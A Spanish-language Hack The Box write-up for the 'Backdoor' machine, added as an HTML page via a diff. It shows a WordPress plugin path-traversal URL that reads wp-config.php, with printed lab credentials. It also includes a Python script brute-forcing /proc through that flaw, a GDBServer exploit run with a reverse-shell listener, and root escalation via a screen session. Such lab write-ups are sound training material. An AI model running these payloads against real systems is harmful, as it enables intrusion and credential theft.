@@ -1,0 +1,151 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Backdoor HTB | Álvaro Ruiz Gutiérrez</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/linux.html">~/writeups/linux</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/backdoor/pasted-20260403010534.png" alt="Backdoor HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Linux</p>
+          <h1>Backdoor</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>screen</span>
+            <span>wordpress</span>
+            <span>procesos</span>
+            <span>LFI</span>
+            <span>GDBServer</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: Web Wordpress</li>
+            <li><code>Explotación</code>: Plugin vulnerable a LFI que enumera procesos para encontrar qué servicio corre en el puerto 1337</li>
+            <li><code>Explotación</code>: PoC del servicio GDBServer que corre en el puerto 1337</li>
+            <li><code>Escalada Privilegios</code>: Proceso Screen</li>
+          </ul>
+        </section>
+
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/backdoor/pasted-20260403011126.png" alt="Enumeración de Backdoor" />
+          <div class="code-card">
+            <h3>Fuzzear Pluggins</h3>
+            <pre><code># URL: http://10.129.96.68/wp-content/plugins/
+# Directory Listing revela plugin ebook</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/backdoor/pasted-20260403122933.png" alt="Directory listing del plugin ebook" />
+          <div class="code-card">
+            <h3>Buscar vulnerabilidades de ebook</h3>
+            <pre><code>searchsploit wordpress ebook
+# LFI: http://10.129.96.68/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/backdoor/pasted-20260403123416.png" alt="Searchsploit wordpress ebook" />
+        </section>
+
+        <section class="writeup-section">
+          <h2>Explotación: LFI</h2>
+          <div class="code-card">
+            <h3>LFI</h3>
+            <pre><code>curl http://10.129.96.68/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
+# Credenciales -> wordpressuser:MQYBJSaD#DxG6qbm
+# DB Name -> wordpress</code></pre>
+          </div>
+          <p>Debe existir un archivo <code>/proc/{PID}/cmdline</code> para el proceso que se está ejecutando en el puerto <code>1337</code>, por lo que podría ser buena idea intentar un ataque de fuerza bruta sobre <code>/proc/{PID}/cmdline</code>, siendo el <code>PID</code> el parámetro a iterar. Esto permitiría obtener el comando que se utilizó para iniciar el proceso.</p>
+          <div class="code-card">
+            <h3>Python Script BruteForce</h3>
+            <pre><code>#!/usr/bin/python3
+
+import requests, signal, time, sys, pdb
+from pwn import *
+
+def def_handler(sig, frame):
+    print("\n\n[!] Saliendo...\n")
+    sys.exit(1)
+
+# Ctrl+C
+signal.signal(signal.SIGINT, def_handler)
+
+# Variables globales
+main_url = "http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl="
+
+def makeRequests():
+    # /proc/PID/cmdline
+
+    p1 = log.progress("Brute Force Attack")
+    p1.status("Starting brute force attack")
+
+    time.sleep(2)
+
+    for i in range(1, 1000):
+        p1.status("Trying with PATH /proc/%s/cmdline" % str(i))
+        url = main_url + "/proc/" + str(i) + "/cmdline"
+        r = requests.get(url)
+
+        if len(r.content) > 82:
+            print("------------------------------------------------------------")
+            log.info("PATH: /proc/%s/cmdline" % str(i))
+            log.info("Total length: %s" % len(r.content))
+            print(r.content)
+            print("------------------------------------------------------------")
+
+if __name__ == '__main__':
+    makeRequests()</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Ejecutar brute.py y filtrar por el puerto 1337</h3>
+            <pre><code>python3 brute.py
+# Puerto 1337: GDBServer</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/backdoor/pasted-20260403133511.png" alt="GDBServer encontrado en el puerto 1337" />
+        </section>
+
+        <section class="writeup-section">
+          <h2>Explotación: GDBServer</h2>
+          <img class="writeup-image" src="/writeups/assets/backdoor/pasted-20260403133622.png" alt="Exploit GDBServer" />
+          <div class="code-card">
+            <h3>Preparar Exploit</h3>
+            <pre><code># Listener
+penelope -p 443
+
+# Exploit
+python3 50539.py 10.129.96.68:1337 rev.bin</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/backdoor/pasted-20260403134807.png" alt="Preparación del exploit GDBServer" />
+          <img class="writeup-image" src="/writeups/assets/backdoor/pasted-20260403134928.png" alt="Shell obtenida mediante GDBServer" />
+        </section>
+
+        <section class="writeup-section">
+          <h2>Escalada Privilegios</h2>
+          <div class="code-card">
+            <h3>Enumerar procesos</h3>
+            <pre><code>ps -faux
+# Corre SCREEN como root</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/backdoor/pasted-20260403142842.png" alt="Proceso screen como root" />
+          <div class="code-card">
+            <h3>Ver qué son los parámetros -dmS</h3>
+            <pre><code>man screen</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/backdoor/pasted-20260403143434.png" alt="Manual de screen" />
+          <img class="writeup-image" src="/writeups/assets/backdoor/pasted-20260403143457.png" alt="Parámetros de screen" />
+          <div class="code-card">
+            <h3>Reconectarnos a la sesión como root</h3>
+            <pre><code>screen -x root/</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/backdoor/pasted-20260403143707.png" alt="Sesión screen como root" />
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
